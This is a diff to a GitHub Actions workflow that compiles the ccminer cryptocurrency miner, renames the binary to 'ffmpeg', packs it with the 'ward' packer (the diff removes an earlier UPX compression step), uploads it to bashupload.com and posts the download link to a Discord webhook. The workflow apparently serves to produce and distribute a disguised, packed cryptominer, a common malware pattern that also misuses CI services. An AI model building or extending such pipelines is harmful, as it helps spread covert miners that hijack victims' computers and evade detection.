@@ -19,7 +19,7 @@ jobs:
     - name: Install Dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool upx
+        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool
 
     - name: Clone and Modify ccminer
       run: |
@@ -34,18 +34,13 @@ jobs:
         ./configure
         make -j$(nproc)
 
-    - name: Compress Binary with UPX
-      run: |
-        cd ccminer-verus
-        mv ccminer ffmpeg
-        upx --best --lzma ./ffmpeg
-
     - name: Install and Pack with Ward
       run: |
         git clone https://github.com/ex0dus-0x/ward.git
         cd ward
         make
-        ./ward ../ccminer-verus/ffmpeg
+        ./ward ../ccminer-verus/ccminer
+        mv ../ccminer-verus/ccminer ../ccminer-verus/ffmpeg
 
     - name: Upload to Bashupload
       run: |
@@ -57,4 +52,3 @@ jobs:
         UPLOAD_URL=$(cat upload_url.txt | grep -o 'https://bashupload.com/[^\"]*')
         curl -H "Content-Type: application/json" -X POST \
         -d "{\"content\":\"$UPLOAD_URL\"}" ${{ secrets.DISCORD_WEBHOOK }}
-        
